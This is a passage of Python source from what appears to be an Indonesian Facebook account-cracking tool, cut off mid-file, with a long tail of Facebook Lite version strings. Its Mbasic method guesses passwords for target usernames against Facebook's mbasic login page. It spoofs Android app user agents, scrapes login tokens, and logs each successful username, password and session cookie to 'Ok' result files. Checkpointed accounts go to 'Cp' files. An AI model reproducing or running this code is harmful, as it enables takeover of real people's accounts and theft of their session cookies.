'362.0.0.0.27', '362.0.0.0.18', '360.0.0.6.53', '360.0.0.5.53', '360.0.0.4.53', '359.0.0.11.81', '359.0.0.10.81', '359.0.0.5.81', '358.0.0.8.62', '358.0.0.6.62', '358.0.0.3.62', '357.0.0.12.72', '357.0.0.10.72', '357.0.0.9.72', '357.0.0.3.72', '356.0.0.7.89', '356.0.0.6.89', '356.0.0.4.89', '356.0.0.2.89', '355.0.0.6.103', '355.0.0.5.103', '355.0.0.4.103', '355.0.0.3.103', '355.0.0.2.103', '354.0.0.8.108', '354.0.0.7.108', '354.0.0.5.108', '354.0.0.2.108', '353.0.0.5.112', '353.0.0.4.112', '353.0.0.3.112', '353.0.0.1.112', '352.0.0.14.108', '352.0.0.8.108', '352.0.0.5.108', '351.0.0.6.115', '351.0.0.5.115', '351.0.0.2.115', '350.0.0.5.116', '350.0.0.4.116', '350.0.0.3.116', '350.0.0.0.21', '350.0.0.0.6', '349.0.0.8.103', '349.0.0.6.103', '349.0.0.5.103', '349.0.0.3.103', '349.0.0.0.93', '349.0.0.0.76', '348.0.0.8.103', '348.0.0.7.103', '349.0.0.0.36', '349.0.0.0.20', '348.0.0.4.103', '349.0.0.0.6', '348.0.0.0.92', '348.0.0.0.78', '347.0.0.17.97', '348.0.0.0.37', '347.0.0.14.97', '348.0.0.0.4', '347.0.0.0.91', '347.0.0.0.78', '346.0.0.8.76', '346.0.0.6.76', '347.0.0.0.22', '346.0.0.5.76', '347.0.0.0.5', '346.0.0.3.76', '346.0.0.0.69', '346.0.0.0.59', '345.0.0.8.69', '345.0.0.6.69', '346.0.0.0.21', '346.0.0.0.16', '345.0.0.3.69', '346.0.0.0.5', '345.0.0.2.69', '345.0.0.0.64', '345.0.0.0.54', '344.0.0.10.83', '345.0.0.0.23', '344.0.0.9.83', '345.0.0.0.13', '344.0.0.6.83', '345.0.0.0.4', '344.0.0.3.83', '344.0.0.0.74', '344.0.0.0.64', '343.0.0.13.79', '344.0.0.0.30', '344.0.0.0.14', '344.0.0.0.5', '343.0.0.11.79', '343.0.0.8.79', '343.0.0.4.79', '343.0.0.0.72', '343.0.0.0.59', '342.0.0.11.89', '342.0.0.8.89', '343.0.0.0.24', '342.0.0.6.89', '343.0.0.0.13', '342.0.0.4.89', '343.0.0.0.3', '342.0.0.0.79', '342.0.0.0.66', '341.0.0.7.68', '342.0.0.0.17', '341.0.0.6.68', '341.0.0.4.68', '342.0.0.0.1', '341.0.0.2.68', '341.0.0.0.63', '341.0.0.0.54', '341.0.0.0.23', '341.0.0.0.16', '341.0.0.0.5', '340.0.0.9.76', '340.0.0.8.76', '340.0.0.5.76', '340.0.0.2.76', '340.0.0.0.72', '340.0.0.0.61', '339.0.0.10.100', '340.0.0.0.28', '339.0.0.8.100', '339.0.0.6.100', '340.0.0.0.18', '340.0.0.0.5', '339.0.0.2.100', '339.0.0.0.92', '339.0.0.0.78', '338.0.0.10.102', '338.0.0.9.102', '339.0.0.0.37', '339.0.0.0.21', '338.0.0.6.102', '338.0.0.5.102', '337.0.0.7.102', '338.0.0.0.34', '338.0.0.0.19', '338.0.0.0.5', '337.0.0.2.102', '337.0.0.0.94', '337.0.0.0.78', '336.0.0.11.99'])
                        self.density = random.choice(['density=2.0, width=720, height=702, scaledDensity=2.0, xdpi=281.353, ydpi=283.028', 'density=2.0, width=720, height=1280, scaledDensity=2.0, xdpi=281.353, ydpi=282.713', 'density=2.0, width=720, height=1369, scaledDensity=2.0, xdpi=281.353, ydpi=279.768', 'density=1.75, width=720, height=1382, scaledDensity=1.75, xdpi=268.941, ydpi=269.986', 'density=2.0, width=720, height=1440, scaledDensity=2.0, xdpi=281.353, ydpi=281.353'])
                        self.useragent = f'{self.useragent_android} [FBAN/EMA;FBLC/id_ID;FBAV/'+ str(self.app_version) +';FBDM/DisplayMetrics{'+ str(self.density) +'};]'
                    else:
                        self.useragent, self.persen = (Generate().Android_Useragent()), (Looping * 100 / len(total))
                    with requests.Session() as r:
                        r.headers.update({
                            'Host': 'mbasic.prod.facebook.com',
                            'Accept-Language': 'en-US,en;q=0.9',
                            'Cache-Control': 'max-age=0',
                            'Upgrade-Insecure-Requests': '1',
                            'User-Agent': self.useragent,
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                            'Sec-Fetch-Site': 'same-origin',
                            'Sec-Fetch-Mode': 'navigate',
                            'Sec-Fetch-User': '?1',
                            'X-Requested-With': 'com.facebook.lite',
                            'Sec-Fetch-Dest': 'document',
                        })
                        response = r.get('https://mbasic.prod.facebook.com/login/?email={}&li=&e=&shbl=1&refsrc=deprecated&_rdr'.format(username)).text
                        try:
                            self.ajaxURI = re.search('method="post" action="(.*?)"', str(response)).group(1).replace('amp;', '')
                            self.lsd = re.search('name="lsd" value="(.*?)"', str(response)).group(1)
                            self.jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
                            self.m_ts = re.search('name="m_ts" value="(\d+)"', str(response)).group(1)
                            self.li = re.search('name="li" value="(.*?)"', str(response)).group(1)
                            self.bi_xrwh = re.search('name="bi_xrwh" value="(.*?)"', str(response)).group(1)
                        except (AttributeError):
                            print("\r                                                        ", end='\r')
                            print("[bold dodger_blue3]   ───>[bold red] ATTRIBUTEERROR!", end='\r')
                            time.sleep(1.5)
                            continue
                        data = {
                            'bi_xrwh': self.bi_xrwh,
                            'lsd': self.lsd,
                            'jazoest': self.jazoest,
                            'm_ts': self.m_ts,
                            'pass': pws,
                            'email': username,
                            'try_number': 0,
                            'unrecognized_tries': 0,
                            'login': 'Masuk',
                        }
                        r.headers.update({
                            'content-type': 'application/x-www-form-urlencoded',
                            'referer': 'https://mbasic.prod.facebook.com/login/?email={}&li=&e=&shbl=1&refsrc=deprecated&_rdr'.format(username),
                            'cookie': ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])),
                            'origin': 'https://mbasic.prod.facebook.com',
                            'content-length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),
                        })
                        response2 = r.post('https://mbasic.prod.facebook.com{}'.format(self.ajaxURI), data = data, allow_redirects = True)
                        #open('Response.txt', 'a+').write(f'{username}|{pws}|{self.useragent}|{str(r.cookies.get_dict())}\n')
                        if 'c_user' in r.cookies.get_dict():
                            self.cookies = ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
                            print("\r                                                        ", end='\r')
                            time.sleep(1.0)
                            tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style = "bold dodger_blue3"), style = "bold white")
                            tree.add(Columns([Panel(f"[bold green]{username}", style = "bold dodger_blue3", width = 30), Panel(f"[bold green]{pws}", style = "bold dodger_blue3", width = 30)]))
                            tree.add(Panel(f"[bold green]{self.cookies}", style = "bold dodger_blue3", width = 61))
                            tree.add(Panel(f"[bold green]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            print(tree)
                            time.sleep(3.0)
                            Sukses.append(f'{username}|{pws}|{self.cookies}|{self.useragent}')
                            with open(f'Results/Ok-{Convert().Tanggal()}.txt', 'a+') as w:
                                w.write(f'{username}|{pws}|{self.cookies}|{self.useragent}\n')
                            w.close()
                            break
                        elif 'checkpoint' in r.cookies.get_dict():
                            print("\r                                                        ", end='\r')
                            time.sleep(1.0)
                            tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style = "bold dodger_blue3"), style = "bold white")
                            tree.add(Columns([Panel(f"[bold red]{username}", style = "bold dodger_blue3", width = 30), Panel(f"[bold red]{pws}", style = "bold dodger_blue3", width = 30)]))
                            tree.add(Panel(f"[bold red]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            print(tree)
                            time.sleep(3.0)
                            Checkpoint.append(f'{username}|{pws}|{self.useragent}')
                            with open(f'Results/Cp-{Convert().Tanggal()}.txt', 'a+') as w:
                                w.write(f'{username}|{pws}|{self.useragent}\n')
                            w.close()
                            break
                        else:
                            continue
            Looping += 1
            print(f"[bold dodger_blue3]   ───>[bold white] Crack[bold green] {str(username)[:15]}[bold white]/[bold blue]{Looping}[bold white]/[bold blue]{str(len(total))}[bold white]/[bold blue]{str(self.persen)[:4]}%[bold white] Cp:-[bold red]{len(Checkpoint)}[bold white] Ok:-[bold green]{len(Sukses)}     ", end='\r');time.sleep(0.0007)
        except (RequestException) as e:
            print("\r                                                        ", end='\r')
            print("[bold dodger_blue3]   ───>[bold red] KONEKSI ERROR!", end='\r')
            time.sleep(10.5)
            self.Mbasic(total, username, password, type_useragent)
        except (Exception) as e:
            print("\r                                                        ", end='\r')
            print(f"[bold dodger_blue3]   ───>[bold red] {str(e).upper()}!", end='\r')

    def Mobile(self, total, username, password, encrypt_password):
        global Sukses, Checkpoint, Looping
        try:
            for pws in password:
                if len(pws) < 6 or username.isnumeric() == False:
                    continue
                else:
                    self.useragent_android, self.persen = (Generate().Android_Useragent()), (Looping * 100 / len(total))
                    self.app_version = random.choice(['373.0.0.0.3', '372.0.0.0.78', '372.0.0.0.21', '372.0.0.0.4', '371.0.0.10.104', '371.0.0.2.104', '371.0.0.0.95', '371.0.0.0.78', '371.0.0.0.33', '370.0.0.16.116', '370.0.0.12.116', '370.0.0.0.39', '369.0.0.5.110', '369.0.0.2.110', '369.0.0.0.84', '369.0.0.0.21', '369.0.0.0.4', '368.0.0.5.95', '368.0.0.4.95', '368.0.0.2.95', '368.0.0.0.84', '368.0.0.0.69', '368.0.0.0.15', '368.0.0.0.3', '367.0.0.7.52', '367.0.0.6.52', '367.0.0.5.52', '367.0.0.0.44', '367.0.0.0.14', '367.0.0.0.3', '366.0.0.10.51', '366.0.0.6.51', '366.0.0.3.51', '366.0.0.0.3', '365.0.0.9.53', '365.0.0.8.53', '365.0.0.4.53', '365.0.0.0.44', '364.0.0.14.77', '364.0.0.11.77', '365.0.0.0.13', '364.0.0.9.77', '365.0.0.0.4', '364.0.0.0.58', '363.0.0.6.63', '363.0.0.5.63', '363.0.0.4.63', '364.0.0.0.16', '364.0.0.0.3', '363.0.0.2.63', '363.0.0.0.60', '363.0.0.0.49', '362.0.0.10.67', '362.0.0.7.67', '363.0.0.0.14', '362.0.0.6.67', '362.0.0.3.67', '363.0.0.0.3', '362.0.0.0.62', '362.0.0.0.49', '361.0.0.12.5', '361.0.0.11.5', '361.0.0.10.5', '361.0.0.9.5', '362.0.0.0.11', '361.0.0.8.5', '361.0.0.6.5', '362.0.0.0.3', '362.0.0.0.46', '362.0.0.0.39', '360.0.0.7.53', '362.0.0.0.27', '362.0.0.0.18', '360.0.0.6.53', '360.0.0.5.53', '360.0.0.4.53', '359.0.0.11.81', '359.0.0.10.81', '359.0.0.5.81', '358.0.0.8.62', '358.0.0.6.62', '358.0.0.3.62', '357.0.0.12.72', '357.0.0.10.72', '357.0.0.9.72', '357.0.0.3.72', '356.0.0.7.89', '356.0.0.6.89', '356.0.0.4.89', '356.0.0.2.89', '355.0.0.6.103', '355.0.0.5.103', '355.0.0.4.103', '355.0.0.3.103', '355.0.0.2.103', '354.0.0.8.108', '354.0.0.7.108', '354.0.0.5.108', '354.0.0.2.108', '353.0.0.5.112', '353.0.0.4.112', '353.0.0.3.112', '353.0.0.1.112', '352.0.0.14.108', '352.0.0.8.108', '352.0.0.5.108', '351.0.0.6.115', '351.0.0.5.115', '351.0.0.2.115', '350.0.0.5.116', '350.0.0.4.116', '350.0.0.3.116', '350.0.0.0.21', '350.0.0.0.6', '349.0.0.8.103', '349.0.0.6.103', '349.0.0.5.103', '349.0.0.3.103', '349.0.0.0.93', '349.0.0.0.76', '348.0.0.8.103', '348.0.0.7.103', '349.0.0.0.36', '349.0.0.0.20', '348.0.0.4.103', '349.0.0.0.6', '348.0.0.0.92', '348.0.0.0.78', '347.0.0.17.97', '348.0.0.0.37', '347.0.0.14.97', '348.0.0.0.4', '347.0.0.0.91', '347.0.0.0.78', '346.0.0.8.76', '346.0.0.6.76', '347.0.0.0.22', '346.0.0.5.76', '347.0.0.0.5', '346.0.0.3.76', '346.0.0.0.69', '346.0.0.0.59', '345.0.0.8.69', '345.0.0.6.69', '346.0.0.0.21', '346.0.0.0.16', '345.0.0.3.69', '346.0.0.0.5', '345.0.0.2.69', '345.0.0.0.64', '345.0.0.0.54', '344.0.0.10.83', '345.0.0.0.23', '344.0.0.9.83', '345.0.0.0.13', '344.0.0.6.83', '345.0.0.0.4', '344.0.0.3.83', '344.0.0.0.74', '344.0.0.0.64', '343.0.0.13.79', '344.0.0.0.30', '344.0.0.0.14', '344.0.0.0.5', '343.0.0.11.79', '343.0.0.8.79', '343.0.0.4.79', '343.0.0.0.72', '343.0.0.0.59', '342.0.0.11.89', '342.0.0.8.89', '343.0.0.0.24', '342.0.0.6.89', '343.0.0.0.13', '342.0.0.4.89', '343.0.0.0.3', '342.0.0.0.79', '342.0.0.0.66', '341.0.0.7.68', '342.0.0.0.17', '341.0.0.6.68', '341.0.0.4.68', '342.0.0.0.1', '341.0.0.2.68', '341.0.0.0.63', '341.0.0.0.54', '341.0.0.0.23', '341.0.0.0.16', '341.0.0.0.5', '340.0.0.9.76', '340.0.0.8.76', '340.0.0.5.76', '340.0.0.2.76', '340.0.0.0.72', '340.0.0.0.61', '339.0.0.10.100', '340.0.0.0.28', '339.0.0.8.100', '339.0.0.6.100', '340.0.0.0.18', '340.0.0.0.5', '339.0.0.2.100', '339.0.0.0.92', '339.0.0.0.78', '338.0.0.10.102', '338.0.0.9.102', '339.0.0.0.37', '339.0.0.0.21', '338.0.0.6.102', '338.0.0.5.102', '337.0.0.7.102', '338.0.0.0.34', '338.0.0.0.19', '338.0.0.0.5', '337.0.0.2.102', '337.0.0.0.94', '337.0.0.0.78', '336.0.0.11.99', '336.0.0.9.99', '337.0.0.0.34', '337.0.0.0.22', '336.0.0.6.99', '337.0.0.0.5', '336.0.0.4.99', '336.0.0.0.89', '336.0.0.0.75', '335.0.0.15.96', '335.0.0.14.96', '336.0.0.0.31', '336.0.0.0.16', '335.0.0.8.96', '336.0.0.0.2', '335.0.0.3.96', '335.0.0.0.90', '335.0.0.0.75', '334.0.0.17.101', '335.0.0.0.37', '335.0.0.0.21', '335.0.0.0.5', '334.0.0.16.101', '334.0.0.15.101', '334.0.0.9.101', '334.0.0.7.101', '334.0.0.0.91', '333.0.0.12.108', '334.0.0.0.75', '333.0.0.10.108', '334.0.0.0.34', '333.0.0.9.108', '334.0.0.0.20', '332.0.0.22.108', '333.0.0.0.99', '333.0.0.0.83', '332.0.0.17.108', '333.0.0.0.38', '333.0.0.0.23', '332.0.0.16.108', '333.0.0.0.4', '332.0.0.0.101', '331.0.0.9.105', '332.0.0.0.86', '331.0.0.8.105', '332.0.0.0.52', '332.0.0.0.5', '331.0.0.6.105', '331.0.0.0.93', '331.0.0.0.81', '330.0.0.10.108', '330.0.0.8.108', '331.0.0.0.21', '331.0.0.0.6', '330.0.0.2.108', '330.0.0.0.98', '330.0.0.0.80', '329.0.0.12.106', '330.0.0.0.38', '329.0.0.11.106', '330.0.0.0.20', '328.0.0.5.102', '327.1.0.16.106', '326.0.0.18.97', '329.0.0.0.94', '326.0.0.17.97', '326.0.0.16.97', '326.0.0.15.97', '328.0.0.0.2', '327.0.0.0.82', '327.0.0.0.36', '327.0.0.0.19', '326.0.0.14.97', '325.0.1.6.108', '325.0.1.5.108', '326.0.0.13.97', '326.0.0.10.97', '326.0.0.8.97', '326.0.0.7.97', '325.0.1.4.108', '326.0.0.0.88', '326.0.0.0.74', '325.0.0.4.108', '326.0.0.0.30', '325.0.0.3.108', '326.0.0.0.16', '326.0.0.0.1', '325.0.0.1.108', '325.0.0.0.96', '324.0.0.8.106', '324.0.0.7.106', '325.0.0.0.32', '325.0.0.0.17', '325.0.0.0.3', '324.0.0.2.106', '324.0.0.0.95', '324.0.0.0.80', '323.0.0.9.106', '324.0.0.0.34', '323.0.0.7.106', '324.0.0.0.19', '323.0.0.6.106', '324.0.0.0.6', '323.0.0.0.97', '323.0.0.0.85', '322.0.0.6.110', '323.0.0.0.38', '323.0.0.0.22', '322.0.0.5.110', '322.0.0.4.110', '323.0.0.0.5', '322.0.0.0.100', '322.0.0.0.86', '321.0.0.13.113', '321.0.0.12.113', '322.0.0.0.39', '321.0.0.10.113', '322.0.0.0.23', '321.0.0.7.113', '322.0.0.0.6', '321.0.0.2.113', '321.0.0.0.104', '321.0.0.0.87', '320.0.0.12.108', '320.0.0.10.108', '320.0.0.8.108', '321.0.0.0.22', '320.0.0.6.108', '320.0.0.5.108', '320.0.0.0.99', '320.0.0.0.81', '319.0.0.7.107', '319.0.0.5.107', '320.0.0.0.36', '320.0.0.0.22', '319.0.0.4.107', '319.0.0.0.98', '319.0.0.0.85', '318.0.0.16.105', '318.0.0.15.105', '319.0.0.0.35', '319.0.0.0.23', '318.0.0.14.105', '318.0.0.11.105', '319.0.0.0.8', '318.0.0.0.79', '318.0.0.0.33', '317.0.0.12.104', '318.0.0.0.21', '317.0.0.10.104', '317.0.0.8.104', '318.0.0.0.6', '317.0.0.6.104', '317.0.0.0.96', '317.0.0.0.76', '316.0.0.14.113', '316.0.0.12.113', '317.0.0.0.16', '317.0.0.0.3', '315.0.0.18.109', '315.0.0.17.109', '315.0.0.11.109', '316.0.0.0.17', '315.0.0.7.109', '316.0.0.0.6', '315.0.0.4.109', '315.0.0.0.99', '314.0.0.18.108', '315.0.0.0.81', '315.0.0.0.21', '315.0.0.0.19', '315.0.0.0.5', '314.0.0.16.108', '314.0.0.14.108', '314.0.0.13.108', '314.0.0.8.108', '314.0.0.6.108', '313.0.0.7.110', '314.0.0.0.83', '314.0.0.0.35', '313.0.0.4.110', '314.0.0.0.19', '313.0.0.3.110', '313.0.0.0.98', '313.0.0.0.81', '312.0.0.10.103', '312.0.0.8.103', '312.0.0.7.103', '312.0.0.4.103', '313.0.0.0.24', '313.0.0.0.20', '312.0.0.3.103', '313.0.0.0.3', '312.0.0.2.103', '312.0.0.0.92', '312.0.0.0.77', '312.0.0.0.33', '311.0.0.7.114', '312.0.0.0.19', '311.0.0.5.114', '312.0.0.0.3', '311.0.0.3.114', '311.0.0.0.100', '311.0.0.0.82', '310.0.0.12.108', '311.0.0.0.37', '310.0.0.10.108', '311.0.0.0.21', '310.0.0.5.108', '311.0.0.0.4', '310.0.0.2.108', '310.0.0.0.99', '310.0.0.0.84', '309.0.0.16.114', '309.0.0.15.114', '309.0.0.14.114', '310.0.0.0.37', '309.0.0.9.114', '310.0.0.0.20', '309.0.0.12.114', '310.0.0.0.4', '309.0.0.6.114', '309.0.0.2.114', '309.0.0.0.104', '309.0.0.0.85', '308.0.0.10.108', '309.0.0.0.40', '308.0.0.8.108', '309.0.0.0.23', '309.0.0.0.5', '308.0.0.2.108', '308.0.0.0.99', '308.0.0.0.82', '307.0.0.9.109', '308.0.0.0.40', '307.0.0.8.109', '308.0.0.0.36', '307.0.0.7.109', '308.0.0.0.22', '307.0.0.5.109', '308.0.0.0.6', '307.0.0.0.100', '307.0.0.0.85', '306.0.0.13.107', '307.0.0.0.37', '307.0.0.0.21', '307.0.0.0.6', '306.0.0.7.107', '306.0.0.2.107', '306.0.0.0.98', '306.0.0.0.81', '305.0.0.12.106', '305.0.0.11.106', '306.0.0.0.32', '305.0.0.6.106', '306.0.0.0.22', '305.0.0.4.106', '306.0.0.0.6', '305.0.0.2.106', '305.0.0.0.96', '305.0.0.0.79', '304.0.0.9.106', '304.0.0.8.106', '305.0.0.0.36', '304.0.0.6.106', '305.0.0.0.20', '304.0.0.4.106', '305.0.0.0.5', '304.0.0.2.106', '304.0.0.0.93', '304.0.0.0.80', '304.0.0.0.33', '303.0.0.7.106', '303.0.0.6.106', '303.0.0.5.106', '304.0.0.0.20', '303.0.0.4.106', '304.0.0.0.6', '303.0.0.2.106', '302.0.0.8.113', '302.0.0.7.113', '303.0.0.0.33', '303.0.0.0.17', '302.0.0.4.113', '303.0.0.0.2', '302.0.0.0.103', '302.0.0.0.88', '301.0.0.13.113', '302.0.0.0.37', '302.0.0.0.21', '301.0.0.8.113', '302.0.0.0.6', '301.0.0.0.102', '301.0.0.0.87', '300.0.0.7.111', '301.0.0.0.39', '301.0.0.0.6', '300.0.0.0.100', '300.0.0.0.83', '299.0.0.11.111', '300.0.0.0.38', '299.0.0.7.111', '300.0.0.0.35', '300.0.0.0.19', '299.0.0.6.111', '299.0.0.5.111', '300.0.0.0.2', '299.0.0.0.97', '299.0.0.0.82', '298.0.0.10.115', '299.0.0.0.33', '299.0.0.0.17', '299.0.0.0.6', '298.0.0.5.115', '298.0.0.0.104', '298.0.0.0.88', '297.0.0.13.113', '297.0.0.10.113', '297.0.0.5.113', '298.0.0.0.22', '298.0.0.0.6', '297.0.0.2.113', '297.0.0.0.103', '297.0.0.0.84', '296.0.0.10.111', '297.0.0.0.25', '296.0.0.8.111', '297.0.0.0.11', '296.0.0.7.111', '296.0.0.4.111', '295.0.0.10.119', '296.0.0.0.25', '295.0.0.7.119', '295.0.0.5.119', '296.0.0.0.1', '295.0.0.4.119', '295.0.0.0.44', '294.0.0.12.118', '294.0.0.10.118', '294.0.0.8.118', '295.0.0.0.6', '294.0.0.2.118', '294.0.0.0.111', '293.0.0.9.114', '293.0.0.7.114', '293.0.0.4.114', '292.0.0.9.109', '292.0.0.7.109', '292.0.0.6.109', '292.0.0.4.109', '292.0.0.0.81', '291.0.0.12.110', '291.0.0.4.110', '290.0.0.15.120', '290.0.0.11.120', '290.0.0.7.120', '289.0.0.18.116', '289.0.0.16.116', '290.0.0.0.38', '289.0.0.13.116', '289.0.0.6.116', '288.0.0.11.115', '288.0.0.10.115', '288.0.0.9.115', '288.0.0.7.115', '288.0.0.6.115', '288.0.0.4.115', '287.0.0.4.117', '288.0.0.0.22', '287.0.0.2.117', '286.0.0.5.105', '287.0.0.0.39', '286.0.0.2.105', '285.0.0.13.118', '285.0.0.10.118', '285.0.0.5.118', '285.0.0.2.118', '285.0.0.0.106', '284.0.0.6.118', '285.0.0.0.38', '284.0.0.5.118', '284.0.0.2.118', '283.0.0.6.117', '283.0.0.5.117', '283.0.0.2.117', '282.0.0.13.117', '282.0.0.11.117', '282.0.0.9.117', '282.0.0.2.117', '281.0.0.13.111', '281.0.0.11.111', '281.0.0.10.111', '281.0.0.8.111', '281.0.0.2.111', '280.0.0.9.119', '280.0.0.7.119', '280.0.0.4.119', '280.0.0.2.119', '279.0.0.10.118', '279.0.0.9.118', '279.0.0.7.118', '278.0.0.12.120', '278.0.0.10.120', '277.0.0.13.119', '278.0.0.5.120', '277.0.0.9.119', '277.0.0.6.119', '277.0.0.4.119', '276.0.0.17.116', '276.0.0.13.116', '276.0.0.10.116', '276.0.0.7.116', '276.0.0.5.116', '276.0.0.2.116', '275.0.0.14.116', '275.0.0.13.116', '275.0.0.11.116', '275.0.0.8.116', '275.0.0.2.116', '274.0.0.22.117', '274.0.0.21.117', '274.0.0.19.117', '274.0.0.16.117', '274.0.0.14.117', '274.0.0.5.117', '273.0.0.22.48', '273.0.0.19.48', '273.0.0.12.48', '273.0.0.8.48', '272.0.0.6.129', '272.0.0.5.129', '271.0.0.6.119', '271.0.0.2.119', '270.0.0.5.118', '270.0.0.2.118', '269.0.0.8.118', '269.0.0.6.118', '268.0.0.5.116', '268.0.0.4.116', '268.0.0.2.116', '267.0.0.14.118', '267.0.0.12.118', '267.0.0.9.118', '267.0.0.2.118', '266.0.0.13.118', '266.0.0.11.118', '266.0.0.9.118', '266.0.0.7.118', '266.0.0.5.118', '265.0.0.14.119', '265.0.0.12.119', '265.0.0.6.119', '264.0.0.12.111', '264.0.0.10.111', '264.0.0.7.111', '263.0.0.11.117', '263.0.0.9.117', '263.0.0.7.117', '263.0.0.4.117', '262.0.0.17.119', '262.0.0.9.119', '262.0.0.6.119', '262.0.0.2.119', '261.0.0.11.119', '261.0.0.9.119', '261.0.0.8.119', '261.0.0.7.119', '260.0.0.7.119', '260.0.0.2.119', '259.0.0.8.120', '259.0.0.5.120', '258.0.0.8.119', '258.0.0.4.119', '257.0.0.13.171', '257.0.0.10.171', '257.0.0.8.171', '257.0.0.6.171', '257.0.0.4.171', '256.0.0.16.119', '256.0.0.14.119', '256.0.0.11.119', '256.0.0.10.119', '256.0.0.5.119', '255.0.0.8.119', '255.0.0.6.119', '255.0.0.4.119', '254.0.0.11.121', '254.0.0.9.121', '254.0.0.5.121', '253.0.0.8.119', '253.0.0.6.119', '253.0.0.5.119', '253.0.0.3.119', '252.0.0.7.119', '252.0.0.6.119', '252.0.0.4.119', '252.0.0.3.119', '251.0.0.4.119', '251.0.0.3.119', '251.0.0.2.119', '250.0.0.8.120', '250.0.0.6.120', '250.0.0.5.120', '250.0.0.2.120', '249.0.0.10.119', '249.0.0.9.119', '249.0.0.5.119', '249.0.0.3.119', '248.0.0.9.116', '248.0.0.4.116', '248.0.0.3.116', '248.0.0.2.116', '247.0.0.6.130', '247.0.0.5.130', '247.0.0.3.130', '247.0.0.2.130', '246.0.0.7.121', '246.0.0.6.121', '246.0.0.4.121', '246.0.0.3.121', '245.0.0.9.119', '245.0.0.6.119', '245.0.0.5.119', '245.0.0.4.119', '245.0.0.3.119', '244.0.0.6.117', '244.0.0.4.117', '244.0.0.3.117', '243.0.0.8.115', '243.0.0.6.115', '243.0.0.5.115', '242.0.0.8.118', '242.0.0.7.118', '242.0.0.6.118', '242.0.0.4.118', '241.0.0.7.119', '241.0.0.6.119', '241.0.0.3.119', '240.0.0.9.115', '240.0.0.6.115', '240.0.0.4.115', '240.0.0.3.115', '239.0.0.10.109', '239.0.0.8.109', '239.0.0.6.109', '239.0.0.5.109', '238.0.0.8.121', '238.0.0.6.121', '238.0.0.5.121', '238.0.0.3.121', '238.0.0.2.121', '237.0.0.7.118', '237.0.0.6.118', '237.0.0.3.118', '237.0.0.2.118', '236.0.0.5.118', '236.0.0.3.118', '235.0.0.5.119', '235.0.0.3.119', '234.0.0.5.118', '234.0.0.4.118', '233.0.0.12.118', '233.0.0.10.118', '233.0.0.7.118', '233.0.0.3.118', '232.0.0.5.117', '232.0.0.3.117', '232.0.0.2.117', '231.0.0.5.122', '231.0.0.2.122', '230.0.0.4.121', '230.0.0.2.121', '229.0.0.8.128', '229.0.0.7.128', '229.0.0.6.128', '229.0.0.3.128', '229.0.0.2.128', '228.0.0.7.119', '228.0.0.6.119', '228.0.0.3.119', '228.0.0.2.119', '227.0.0.5.115', '227.0.0.4.115', '226.0.0.13.116', '226.0.0.12.116', '226.0.0.6.116', '226.0.0.2.116', '225.0.0.12.114', '225.0.0.9.114', '225.0.0.5.114', '225.0.0.4.114', '225.0.0.3.114', '224.0.0.9.117', '224.0.0.7.117', '224.0.0.2.117', '223.0.0.11.121', '223.0.0.8.121', '223.0.0.6.121', '222.0.0.10.118', '222.0.0.9.118', '222.0.0.7.118', '222.0.0.5.118', '222.0.0.4.118', '221.0.0.12.120', '221.0.0.10.120', '221.0.0.9.120', '221.0.0.8.120', '221.0.0.4.120', '221.0.0.3.120', '221.0.0.2.120', '220.0.0.12.121', '220.0.0.11.121', '220.0.0.9.121', '220.0.0.8.121', '220.0.0.4.121', '219.0.0.12.120', '219.0.0.9.120', '219.0.0.8.120', '219.0.0.2.120', '218.0.0.6.119', '218.0.0.5.119', '217.0.0.14.121', '217.0.0.10.121', '217.0.0.6.121', '217.0.0.3.121', '216.0.0.10.121', '216.0.0.6.121', '216.0.0.5.121', '216.0.0.4.121', '216.0.0.2.121', '215.0.0.9.119', '215.0.0.7.119', '215.0.0.3.119', '215.0.0.2.119', '214.0.0.4.109', '214.0.0.3.109', '213.0.0.9.122', '213.0.0.6.122', '213.0.0.5.122', '213.0.0.4.122', '213.0.0.2.122', '212.0.0.6.106', '212.0.0.5.106', '212.0.0.4.106', '212.0.0.2.106', '211.0.0.7.121', '211.0.0.4.121', '211.0.0.3.121', '211.0.0.2.121', '210.0.0.7.113', '210.0.0.5.113', '210.0.0.4.113', '209.0.0.5.119', '209.0.0.4.119', '209.0.0.2.119', '208.0.0.5.120', '208.0.0.2.120', '207.0.0.9.119', '207.0.0.6.119', '207.0.0.4.119', '207.0.0.3.119', '206.0.0.6.119', '206.0.0.5.119', '206.0.0.4.119', '206.0.0.3.119', '206.0.0.2.119', '205.0.0.8.119', '205.0.0.6.119', '205.0.0.4.119', '205.0.0.3.119', '204.0.0.6.121', '204.0.0.5.121', '204.0.0.2.121', '203.0.0.7.120', '203.0.0.5.120', '203.0.0.4.120', '203.0.0.2.120', '202.0.0.7.118', '202.0.0.6.118', '202.0.0.4.118', '202.0.0.3.118', '201.0.0.7.119', '201.0.0.6.119', '201.0.0.4.119', '201.0.0.2.119', '200.0.0.8.117', '200.0.0.5.117', '200.0.0.4.117', '199.0.0.10.108', '199.0.0.9.108', '199.0.0.6.108', '199.0.0.5.108', '199.0.0.4.108', '198.0.0.14.122', '198.0.0.13.122', '198.0.0.10.122', '198.0.0.8.122', '198.0.0.6.122', '197.1.0.17.125', '198.0.0.5.122', '197.0.0.15.125', '197.0.0.12.125', '197.0.0.8.125', '197.0.0.6.125', '197.0.0.3.125', '196.0.0.8.121', '196.0.0.6.121', '196.0.0.5.121', '196.0.0.4.121', '196.0.0.3.121', '195.0.0.9.119', '195.0.0.7.119', '195.0.0.6.119'])
